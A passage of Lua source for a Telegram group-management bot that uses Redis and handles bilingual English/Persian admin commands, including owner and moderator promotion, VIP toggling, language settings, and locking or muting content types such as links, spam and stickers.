          return "\217\136\216\182\216\185\219\140\216\170 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\173\216\167\217\132\216\170 \216\185\216\167\216\175\219\140 (+\216\170\216\168\217\132\219\140\216\186) \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        else
          redis:hset("GroupSettings:" .. Chat, "is_vip", true)
          return "\217\136\216\182\216\185\219\140\216\170 \218\175\216\177\217\136\217\135 \216\168\217\135 \216\173\216\167\217\132\216\170 V.I.P (\217\136\219\140\218\152\217\135 \217\136 \216\168\216\175\217\136\217\134 \216\170\216\168\217\132\219\140\216\186) \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        end
      elseif matches[2] and matches[2]:match("-100%d+") then
        Chat = matches[2]
        if redis:hget("GroupSettings:" .. Chat, "is_vip") then
          redis:hdel("GroupSettings:" .. Chat, "is_vip")
          return "\217\136\216\182\216\185\219\140\216\170 \218\175\216\177\217\136\217\135 " .. matches[2] .. " \216\168\217\135 \216\173\216\167\217\132\216\170 \216\185\216\167\216\175\219\140 (+\216\170\216\168\217\132\219\140\216\186) \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        else
          redis:hset("GroupSettings:" .. Chat, "is_vip", true)
          return "\217\136\216\182\216\185\219\140\216\170 \218\175\216\177\217\136\217\135 " .. matches[2] .. " \216\168\217\135 \216\173\216\167\217\132\216\170 V.I.P (\217\136\219\140\218\152\217\135 \217\136 \216\168\216\175\217\136\217\134 \216\170\216\168\217\132\219\140\216\186) \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175"
        end
      end
    end
    if (matches[1]:lower() == "install" or matches[1] == "\217\134\216\181\216\168 \218\175\216\177\217\136\217\135") and is_sudo(msg) and not matches[2] then
      return modadd(msg, false)
    elseif (matches[1]:lower() == "install" or matches[1] == "\217\134\216\181\216\168 \218\175\216\177\217\136\217\135") and is_sudo(msg) and matches[2] then
      if not redis:sismember("SudoAccess" .. msg.from.id, "changecharge") and is_sudo(msg) and not is_botOwner(msg) then
        if not lang then
          return ErrorAccessSudo(msg)
        else
          return ErrorAccessSudo(msg)
        end
      end
      return modadd(msg, tonumber(matches[2]))
    end
    if (matches[1]:lower() == "remove" or matches[1] == "\216\173\216\176\217\129 \218\175\216\177\217\136\217\135") and not matches[2] and is_sudo(msg) then
      return modrem(msg)
    end
    if (matches[1]:lower() == "remove" or matches[1] == "\216\173\216\176\217\129 \218\175\216\177\217\136\217\135") and matches[2] and is_botOwner(msg) then
      botremByID(msg, matches[2])
      return "\218\175\216\177\217\136\217\135 `" .. matches[2] .. "` \216\173\216\176\217\129 \216\180\216\175 \217\136 \216\177\216\168\216\167\216\170 \216\167\216\178 \216\162\217\134 \217\132\217\129\216\170 \216\175\216\167\216\175"
    end
    if (matches[1]:lower() == "setowner" or matches[1] == "\216\170\217\134\216\184\219\140\217\133 \216\181\216\167\216\173\216\168") and is_owner(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply, {
          chat_id = msg.to.id,
          cmd = "setowner"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "GetUser",
          user_id_ = matches[2]
        }, action_by_id, {
          chat_id = msg.to.id,
          user_id = matches[2],
          cmd = "setowner"
        })
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "setowner"
        })
      end
    end
    if (matches[1]:lower() == "delowner" or matches[1] == "\216\173\216\176\217\129 \216\181\216\167\216\173\216\168") and is_owner(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply, {
          chat_id = msg.to.id,
          cmd = "delowner"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "GetUser",
          user_id_ = matches[2]
        }, action_by_id, {
          chat_id = msg.to.id,
          user_id = matches[2],
          cmd = "delowner"
        })
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "delowner"
        })
      end
    end
    if (matches[1]:lower() == "promote" or matches[1] == "\216\167\216\177\216\170\217\130\216\167") and is_owner(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply, {
          chat_id = msg.to.id,
          cmd = "promote"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "GetUser",
          user_id_ = matches[2]
        }, action_by_id, {
          chat_id = msg.to.id,
          user_id = matches[2],
          cmd = "promote"
        })
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "promote"
        })
      end
    end
    if (matches[1]:lower() == "demote" or matches[1] == "\216\170\217\134\216\178\219\140\217\132") and is_owner(msg) then
      if not matches[2] and msg.reply_id then
        tdcli_function({
          ID = "GetMessage",
          chat_id_ = msg.to.id,
          message_id_ = msg.reply_id
        }, action_by_reply, {
          chat_id = msg.to.id,
          cmd = "demote"
        })
      end
      if matches[2] and string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "GetUser",
          user_id_ = matches[2]
        }, action_by_id, {
          chat_id = msg.to.id,
          user_id = matches[2],
          cmd = "demote"
        })
      end
      if matches[2] and not string.match(matches[2], "^%d+$") then
        tdcli_function({
          ID = "SearchPublicChat",
          username_ = matches[2]
        }, action_by_username, {
          chat_id = msg.to.id,
          username = matches[2],
          cmd = "demote"
        })
      end
    end
    if (matches[1]:lower() == "maxchat" or matches[1] == "\216\173\216\175\216\167\218\169\216\171\216\177 \218\134\216\170") and is_owner(msg) then
      currentChat = "currentChat:" .. msg.to.id
      mxRedis = "maxChat:" .. msg.to.id
      MaxChat = matches[2]
      MaxChatSize = tonumber(MaxChat)
      if MaxChatSize > 100 then
        redis:set(currentChat, "0")
        redis:set(mxRedis, MaxChat)
        if not lang then
          return "*Maxchat has been changed to:* `" .. MaxChat .. "`"
        else
          return "*\216\170\216\185\216\175\216\167\216\175 \216\173\216\175\216\167\218\169\216\171\216\177\217\138 \218\134\216\170 \216\170\216\186\217\138\217\138\216\177 \218\169\216\177\216\175 \216\168\217\135:* `" .. MaxChat .. "`"
        end
      elseif not lang then
        return "*Your input should be more than* `100`"
      else
        return "*\217\136\216\177\217\136\216\175\219\140 \216\180\217\133\216\167 \216\168\216\167\219\140\216\175 \216\168\219\140\216\180\216\170\216\177 \216\167\216\178* `100` *\216\168\216\167\216\180\216\175*"
      end
    end
    if (matches[1]:lower() == "setlang" or matches[1] == "\216\170\216\186\219\140\219\140\216\177 \216\178\216\168\216\167\217\134") and is_owner(msg) then
      if matches[2] == "en" or matches[2] == "\216\167\217\134\218\175\217\132\219\140\216\179\219\140" then
        if msg.to.type ~= "pv" then
          redis:sadd("Bot(EN)Groups", msg.to.id)
          redis:srem("Bot(FA)Groups", msg.to.id)
        end
        redis:del("gp_lang:" .. msg.to.id)
        return "*Language of this chat has been changed to* \240\159\135\172\240\159\135\167"
      elseif matches[2] == "fa" or matches[2] == "\217\129\216\167\216\177\216\179\219\140" then
        if msg.to.type ~= "pv" then
          redis:sadd("Bot(FA)Groups", msg.to.id)
          redis:srem("Bot(EN)Groups", msg.to.id)
        end
        redis:set("gp_lang:" .. msg.to.id, true)
        return "*\216\178\216\168\216\167\217\134 \216\167\219\140\217\134 \218\175\217\129\216\170\218\175\217\136 \216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\170\216\186\219\140\219\140\216\177 \218\169\216\177\216\175 \216\168\217\135* \240\159\135\174\240\159\135\183"
      end
    end
    if (matches[1]:lower() == "lock" or matches[1] == "\217\130\217\129\217\132") and is_mod(msg) then
      if matches[2] == "link" or matches[2] == "\217\132\219\140\217\134\218\169" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "link", "Link", "\217\132\219\140\217\134\218\169", true)
        else
          lock_item2(msg, "link", "Link", "\217\132\219\140\217\134\218\169", true)
        end
      elseif matches[2] == "tag" or matches[2] == "\216\170\218\175" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "tag", "Tag", "\216\170\218\175", true)
        else
          lock_item2(msg, "tag", "Tag", "\216\170\218\175", true)
        end
      elseif matches[2] == "username" or matches[2] == "\219\140\217\136\216\178\216\177\217\134\219\140\217\133" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "username", "UserName", "\219\140\217\136\216\178\216\177\217\134\219\140\217\133", false)
        else
          lock_item2(msg, "username", "UserName", "\219\140\217\136\216\178\216\177\217\134\219\140\217\133", false)
        end
      elseif matches[2] == "join" or matches[2] == "\217\136\216\177\217\136\216\175" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "join", "Join", "\217\136\216\177\217\136\216\175", false)
        else
          lock_item2(msg, "join", "Join", "\217\136\216\177\217\136\216\175", false)
        end
      elseif matches[2] == "note" or matches[2] == "video note" or matches[2] == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140" or matches[2] == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\219\140\217\136\219\140\219\140" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "note", "Video Note", "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140", false)
        else
          lock_item2(msg, "note", "Video Note", "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140", false)
        end
      elseif matches[2] == "mention" or matches[2] == "\217\133\217\134\216\180\217\134" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "mention", "Mention", "\217\133\217\134\216\180\217\134", true)
        else
          lock_item2(msg, "mention", "Mention", "\217\133\217\134\216\180\217\134", true)
        end
      elseif matches[2] == "arabic" or matches[2] == "\216\185\216\177\216\168\219\140" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "arabic", "Arabic", "\216\185\216\177\216\168\219\140", false)
        else
          lock_item2(msg, "arabic", "Arabic", "\216\185\216\177\216\168\219\140", false)
        end
      elseif matches[2] == "edit" or matches[2] == "\216\167\216\175\219\140\216\170" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "edit", "Edit", "\216\167\216\175\219\140\216\170", false)
        else
          lock_item2(msg, "edit", "Edit", "\216\167\216\175\219\140\216\170", false)
        end
      elseif matches[2] == "spam" or matches[2] == "\216\167\216\179\217\190\217\133" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "spam", "Spam", "\216\167\216\179\217\190\217\133", false)
        else
          lock_item2(msg, "spam", "Spam", "\216\167\216\179\217\190\217\133", false)
        end
      elseif matches[2] == "flood" or matches[2] == "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "flood", "Flood", "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140", false)
        else
          lock_item2(msg, "flood", "Flood", "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140", false)
        end
      elseif matches[2] == "bots" or matches[2] == "\216\177\216\168\216\167\216\170 \217\135\216\167" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "bots", "Bots", "\216\177\216\168\216\167\216\170 \217\135\216\167", false)
        else
          lock_item2(msg, "bots", "Bots", "\216\177\216\168\216\167\216\170 \217\135\216\167", false)
        end
      elseif matches[2] == "markdown" or matches[2] == "\217\129\217\136\217\134\216\170" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "markdown", "Markdown", "\217\129\217\136\217\134\216\170", false)
        else
          lock_item2(msg, "markdown", "Markdown", "\217\129\217\136\217\134\216\170", false)
        end
      elseif matches[2] == "webpage" or matches[2] == "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "webpage", "Webpage", "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168", false)
        else
          lock_item2(msg, "webpage", "Webpage", "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168", false)
        end
      elseif matches[2] == "pin" or matches[2] == "\216\179\217\134\216\172\216\167\217\130" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "pin", "Pin", "\216\179\217\134\216\172\216\167\217\130", false)
        else
          lock_item2(msg, "pin", "Pin", "\216\179\217\134\216\172\216\167\217\130", false)
        end
      elseif matches[2] == "maxwords" or matches[2] == "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "MaxWords", "MaxWords", "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170", false)
        else
          lock_item2(msg, "MaxWords", "MaxWords", "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170", false)
        end
      elseif matches[2] == "botchat" or matches[2] == "\218\134\216\170 \216\177\216\168\216\167\216\170" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "BotChat", "BotChat", "\218\134\216\170 \216\177\216\168\216\167\216\170", false)
        else
          lock_item2(msg, "BotChat", "BotChat", "\218\134\216\170 \216\177\216\168\216\167\216\170", false)
        end
      elseif matches[2] == "fohsh" or matches[2] == "\217\129\216\173\216\180" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "fohsh", "Fohsh", "\217\129\216\173\216\180", false)
        else
          lock_item2(msg, "fohsh", "Fohsh", "\217\129\216\173\216\180", false)
        end
      elseif matches[2] == "english" or matches[2] == "\216\167\217\134\218\175\217\132\219\140\216\179\219\140" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "english", "English", "\216\167\217\134\218\175\217\132\219\140\216\179\219\140", false)
        else
          lock_item2(msg, "english", "English", "\216\167\217\134\218\175\217\132\219\140\216\179\219\140", false)
        end
      elseif matches[2] == "forcedinvite" or matches[2] == "forced invite" or matches[2] == "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140" then
        if not redis:get("EditBot:lockandunlock") then
          lock_item(msg, "forcedinvite", "Forced invite", "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140", false)
        else
          lock_item2(msg, "forcedinvite", "Forced invite", "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140", false)
        end
      elseif matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
        if not redis:get("EditBot:lockandunlock") then
          if redis:get("GroupCmdsAccess:" .. msg.to.id) then
            redis:del("GroupCmdsAccess:" .. msg.to.id)
            if lang then
              return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \216\168\216\167\216\178 \216\180\216\175"
            else
              return "*Cmds Has Been Unlocked For Members*"
            end
          else
            redis:set("GroupCmdsAccess:" .. msg.to.id, "moderator")
            if lang then
              return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \217\130\217\129\217\132 \216\180\216\175"
            else
              return "*Cmds Has Been Locked For Members*"
            end
          end
        elseif redis:get("GroupCmdsAccess:" .. msg.to.id) then
          if lang then
            return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \216\167\216\178 \217\130\216\168\217\132 \217\130\217\129\217\132 \216\168\217\136\216\175"
          else
            return "*Cmds is Already Locked For Members*"
          end
        else
          redis:set("GroupCmdsAccess:" .. msg.to.id, "moderator")
          if lang then
            return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \217\130\217\129\217\132 \216\180\216\175"
          else
            return "*Cmds Has Been Locked For Members*"
          end
        end
      elseif matches[2] == "all" or matches[2] == "\217\135\217\133\217\135" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "all", "All", "\217\135\217\133\217\135", true)
        else
          mute_item2(msg, "all", "All", "\217\135\217\133\217\135", true)
        end
      elseif matches[2] == "gif" or matches[2] == "\218\175\219\140\217\129" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "gif", "Gif", "\218\175\219\140\217\129", true)
        else
          mute_item2(msg, "gif", "Gif", "\218\175\219\140\217\129", true)
        end
      elseif matches[2] == "text" or matches[2] == "\217\133\216\170\217\134" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "text", "Text", "\217\133\216\170\217\134", false)
        else
          mute_item2(msg, "text", "Text", "\217\133\216\170\217\134", false)
        end
      elseif matches[2] == "photo" or matches[2] == "\216\185\218\169\216\179" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "photo", "Photo", "\216\185\218\169\216\179", true)
        else
          mute_item2(msg, "photo", "Photo", "\216\185\218\169\216\179", true)
        end
      elseif matches[2] == "video" or matches[2] == "\217\129\219\140\217\132\217\133" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "video", "Video", "\217\129\219\140\217\132\217\133", true)
        else
          mute_item2(msg, "video", "Video", "\217\129\219\140\217\132\217\133", true)
        end
      elseif matches[2] == "audio" or matches[2] == "\216\162\217\135\217\134\218\175" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "audio", "Audio", "\216\162\217\135\217\134\218\175", true)
        else
          mute_item2(msg, "audio", "Audio", "\216\162\217\135\217\134\218\175", true)
        end
      elseif matches[2] == "voice" or matches[2] == "\216\181\216\175\216\167" or matches[2] == "\216\181\216\175\216\167" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "voice", "Voice", "\216\181\216\175\216\167", true)
        else
          mute_item2(msg, "voice", "Voice", "\216\181\216\175\216\167", true)
        end
      elseif matches[2] == "sticker" or matches[2] == "\216\167\216\179\216\170\219\140\218\169\216\177" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177", true)
        else
          mute_item2(msg, "sticker", "Sticker", "\216\167\216\179\216\170\219\140\218\169\216\177", true)
        end
      elseif matches[2] == "contact" or matches[2] == "\217\133\216\174\216\167\216\183\216\168" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "contact", "Contact", "\217\133\216\174\216\167\216\183\216\168", true)
        else
          mute_item2(msg, "contact", "Contact", "\217\133\216\174\216\167\216\183\216\168", true)
        end
      elseif matches[2] == "forward" or matches[2] == "\217\129\217\136\216\177\217\136\216\167\216\177\216\175" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "forward", "Forward", "\217\129\217\136\216\177\217\136\216\167\216\177\216\175", true)
        else
          mute_item2(msg, "forward", "Forward", "\217\129\217\136\216\177\217\136\216\167\216\177\216\175", true)
        end
      elseif matches[2] == "location" or matches[2] == "\217\133\218\169\216\167\217\134" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "location", "Location", "\217\133\218\169\216\167\217\134", true)
        else
          mute_item2(msg, "location", "Location", "\217\133\218\169\216\167\217\134", true)
        end
      elseif matches[2] == "document" or matches[2] == "\217\129\216\167\219\140\217\132" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "document", "Document", "\217\129\216\167\219\140\217\132", true)
        else
          mute_item2(msg, "document", "Document", "\217\129\216\167\219\140\217\132", true)
        end
      elseif matches[2] == "tgservice" or matches[2] == "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "tgservice", "Tgservice", "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133", false)
        else
          mute_item2(msg, "tgservice", "Tgservice", "\216\174\216\175\217\133\216\167\216\170 \216\170\217\132\218\175\216\177\216\167\217\133", false)
        end
      elseif matches[2] == "inline" or matches[2] == "\216\167\219\140\217\134\217\132\216\167\219\140\217\134" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "inline", "Inline", "\216\167\219\140\217\134\217\132\216\167\219\140\217\134", true)
        else
          mute_item2(msg, "inline", "Inline", "\216\167\219\140\217\134\217\132\216\167\219\140\217\134", true)
        end
      elseif matches[2] == "game" or matches[2] == "\216\168\216\167\216\178\219\140" or matches[2] == "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "game", "Game", "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134", true)
        else
          mute_item2(msg, "game", "Game", "\216\168\216\167\216\178\219\140 \217\135\216\167\219\140 \216\162\217\134\217\132\216\167\219\140\217\134", true)
        end
      elseif matches[2] == "keyboard" or matches[2] == "\218\169\219\140\216\168\217\136\216\177\216\175" or matches[2] == "\216\181\217\129\216\173\217\135 \218\169\217\132\219\140\216\175" then
        if not redis:get("EditBot:lockandunlock") then
          mute_item(msg, "keyboard", "Keyboard", "\218\169\219\140\216\168\217\136\216\177\216\175", true)
        else
          mute_item2(msg, "keyboard", "Keyboard", "\218\169\219\140\216\168\217\136\216\177\216\175", true)
        end
      elseif not redis:get("EditBot:lockandunlock") then
        Locks = redis:smembers("GroupAddSettings:" .. msg.to.id)
        Items = redis:smembers("GroupAddSettingsItem:" .. msg.to.id .. ":" .. matches[2])
        if #Items ~= 0 and redis:sismember("GroupAddSettings:" .. msg.to.id, matches[2]) then
          if not redis:get("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2]) then
            redis:set("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2], true)
            for k, v in pairs(Items) do
              redis:hset("GroupSettings:" .. msg.to.id, v, "yes")
            end
            if not lang then
              return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Enabled`]]
            else
              return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\217\129\216\185\216\167\217\132 \216\180\216\175`"
            end
          else
            redis:del("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2])
            for k, v in pairs(Items) do
              redis:hdel("GroupSettings:" .. msg.to.id, v)
            end
            if not lang then
              return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Disabled`]]
            else
              return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\216\186\219\140\216\177 \217\129\216\185\216\167\217\132 \216\180\216\175`"
            end
          end
        end
      else
        Locks = redis:smembers("GroupAddSettings:" .. msg.to.id)
        Items = redis:smembers("GroupAddSettingsItem:" .. msg.to.id .. ":" .. matches[2])
        if #Items ~= 0 and redis:sismember("GroupAddSettings:" .. msg.to.id, matches[2]) then
          if not redis:get("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2]) then
            redis:set("AppliedAddSettings:" .. msg.to.id .. ":" .. matches[2], true)
            for k, v in pairs(Items) do
              redis:hset("GroupSettings:" .. msg.to.id, v, "yes")
            end
            if not lang then
              return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Enabled`]]
            else
              return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\217\129\216\185\216\167\217\132 \216\180\216\175`"
            end
          elseif not lang then
            return "*Private Lock:* `" .. matches[2] .. [[
` 
*Status:* `Already Enabled`]]
          else
            return "\217\130\217\129\217\132 \216\174\216\181\217\136\216\181\219\140: `" .. matches[2] .. "` \n\217\136\216\182\216\185\219\140\216\170: `\216\167\216\178 \217\130\216\168\217\132 \217\129\216\185\216\167\217\132 \216\168\217\136\216\175`"
          end
        end
      end
    end
    if (matches[1]:lower() == "unlock" or matches[1] == "\216\168\216\167\216\178 \218\169\216\177\216\175\217\134") and is_mod(msg) and redis:get("EditBot:lockandunlock") then
      if matches[2] == "link" or matches[2] == "\217\132\219\140\217\134\218\169" then
        unlock_item(msg, "link", "Link", "\217\132\219\140\217\134\218\169", true)
      elseif matches[2] == "tag" or matches[2] == "\216\170\218\175" then
        unlock_item(msg, "tag", "Tag", "\216\170\218\175", true)
      elseif matches[2] == "username" or matches[2] == "\219\140\217\136\216\178\216\177\217\134\219\140\217\133" then
        unlock_item(msg, "username", "UserName", "\219\140\217\136\216\178\216\177\217\134\219\140\217\133", false)
      elseif matches[2] == "join" or matches[2] == "\217\136\216\177\217\136\216\175" then
        unlock_item(msg, "join", "Join", "\217\136\216\177\217\136\216\175", false)
      elseif matches[2] == "note" or matches[2] == "video note" or matches[2] == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140" or matches[2] == "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\219\140\217\136\219\140\219\140" then
        unlock_item(msg, "note", "Video Note", "\217\190\219\140\216\167\217\133 \217\136\219\140\216\175\216\166\217\136\219\140\219\140", false)
      elseif matches[2] == "mention" or matches[2] == "\217\133\217\134\216\180\217\134" then
        unlock_item(msg, "mention", "Mention", "\217\133\217\134\216\180\217\134", true)
      elseif matches[2] == "arabic" or matches[2] == "\216\185\216\177\216\168\219\140" then
        unlock_item(msg, "arabic", "Arabic", "\216\185\216\177\216\168\219\140", false)
      elseif matches[2] == "edit" or matches[2] == "\216\167\216\175\219\140\216\170" then
        unlock_item(msg, "edit", "Edit", "\216\167\216\175\219\140\216\170", false)
      elseif matches[2] == "spam" or matches[2] == "\216\167\216\179\217\190\217\133" then
        unlock_item(msg, "spam", "Spam", "\216\167\216\179\217\190\217\133", false)
      elseif matches[2] == "flood" or matches[2] == "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140" then
        unlock_item(msg, "flood", "Flood", "\217\190\219\140\216\167\217\133 \216\177\218\175\216\168\216\167\216\177\219\140", false)
      elseif matches[2] == "bots" or matches[2] == "\216\177\216\168\216\167\216\170 \217\135\216\167" then
        unlock_item(msg, "bots", "Bots", "\216\177\216\168\216\167\216\170 \217\135\216\167", false)
      elseif matches[2] == "markdown" or matches[2] == "\217\129\217\136\217\134\216\170" then
        unlock_item(msg, "markdown", "Markdown", "\217\129\217\136\217\134\216\170", false)
      elseif matches[2] == "webpage" or matches[2] == "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168" then
        unlock_item(msg, "webpage", "Webpage", "\216\181\217\129\216\173\216\167\216\170 \217\136\216\168", false)
      elseif matches[2] == "pin" or matches[2] == "\216\179\217\134\216\172\216\167\217\130" then
        unlock_item(msg, "pin", "Pin", "\216\179\217\134\216\172\216\167\217\130", false)
      elseif matches[2] == "maxwords" or matches[2] == "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170" then
        unlock_item(msg, "MaxWords", "MaxWords", "\216\173\216\175\216\167\218\169\216\171\216\177 \218\169\217\132\217\133\216\167\216\170", false)
      elseif matches[2] == "botchat" or matches[2] == "\218\134\216\170 \216\177\216\168\216\167\216\170" then
        unlock_item(msg, "BotChat", "BotChat", "\218\134\216\170 \216\177\216\168\216\167\216\170", false)
      elseif matches[2] == "fohsh" or matches[2] == "\217\129\216\173\216\180" then
        unlock_item(msg, "fohsh", "Fohsh", "\217\129\216\173\216\180", false)
      elseif matches[2] == "english" or matches[2] == "\216\167\217\134\218\175\217\132\219\140\216\179\219\140" then
        unlock_item(msg, "english", "English", "\216\167\217\134\218\175\217\132\219\140\216\179\219\140", false)
      elseif matches[2] == "forcedinvite" or matches[2] == "forced invite" or matches[2] == "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140" then
        unlock_item(msg, "forcedinvite", "Forced invite", "\216\175\216\185\217\136\216\170 \216\167\216\172\216\168\216\167\216\177\219\140", false)
      elseif matches[2] == "cmds" or matches[2] == "\216\175\216\179\216\170\217\136\216\177\216\167\216\170" then
        if redis:get("GroupCmdsAccess:" .. msg.to.id) then
          redis:del("GroupCmdsAccess:" .. msg.to.id)
          if lang then
            return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \216\168\216\167\216\178 \216\180\216\175"
          else
            return "*Cmds Has Been Unlocked For Members*"
          end
        elseif lang then
          return "\216\175\216\179\216\170\217\136\216\177 \216\168\217\135 \216\177\216\168\216\167\216\170 \216\168\216\177\216\167\219\140 \218\169\216\167\216\177\216\168\216\177\216\167\217\134 \216\185\216\167\216\175\219\140 \216\167\216\178 \217\130\216\168\217\132 \216\168\216\167\216\178 \216\168\217\136\216\175"
        else
